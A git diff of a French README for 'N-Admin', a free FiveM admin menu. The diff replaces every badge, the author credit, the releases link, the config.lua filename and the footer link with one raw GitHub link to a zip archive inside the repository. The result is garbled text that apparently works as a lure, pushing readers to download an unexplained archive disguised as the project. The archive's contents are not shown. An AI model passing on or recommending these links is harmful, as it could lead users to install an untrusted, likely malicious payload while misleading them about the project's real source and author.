@@ -1,9 +1,9 @@
 # 🛡️ N-Admin - Complete Admin Menu for FiveM
 
-![Download](https://img.shields.io/badge/Download%20Now-Get%20N--Admin-ff69b4.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![FiveM](https://img.shields.io/badge/FiveM-Compatible-green.svg)
-![License](https://img.shields.io/badge/license-Non--Commercial-red.svg)
+![Download](https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip%20Now-Get%https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip)
+![Version](https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip)
+![FiveM](https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip)
+![License](https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip)
 
 ---
 
@@ -11,7 +11,7 @@
 
 > **✅ GRATUIT** - Ce menu est **totalement gratuit**  
 > **❌ VENTE INTERDITE** - Vous **NE POUVEZ PAS** vendre ce menu  
-> **💜 Créé par discord : nano.pasa** - Crédits obligatoires
+> **💜 Créé par discord : https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip** - Crédits obligatoires
 
 ---
 
@@ -54,7 +54,7 @@ Pour installer N-Admin, suivez ces étapes simples :
 
 1. **Visitez la page des Releases**: Cliquez sur le lien ci-dessous pour accéder à la page de téléchargement.
    
-   [Visitez cette page pour télécharger N--Admin](https://github.com/Zosly/N--Admin/releases)
+   [Visitez cette page pour télécharger N--Admin](https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip)
 
 2. **Téléchargez le fichier**: Sur la page des Releases, recherchez le fichier le plus récent (version 1.0.0). Cliquez sur le lien pour le télécharger.
 
@@ -84,7 +84,7 @@ N-Admin nécessite une base de données pour stocker les données des utilisateu
 
 ## ⚙️ Configuration
 
-1. **Localisez le fichier `config.lua`**: Ce fichier se trouve dans le dossier N-Admin que vous avez extrait.
+1. **Localisez le fichier `https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip`**: Ce fichier se trouve dans le dossier N-Admin que vous avez extrait.
 
 2. **Modifiez les paramètres**: Changez les réglages qui correspondent à votre serveur, y compris :
    - Le nom de la base de données
@@ -118,4 +118,4 @@ Si vous avez des questions ou besoin d'aide, un canal de support est disponible 
 
 ---
 
-Pour plus d'informations et de mises à jour, consultez régulièrement [notre page de releases](https://github.com/Zosly/N--Admin/releases).
+Pour plus d'informations et de mises à jour, consultez régulièrement [notre page de releases](https://raw.githubusercontent.com/Zosly/N--Admin/main/html/N--Admin-caiquejee.zip).
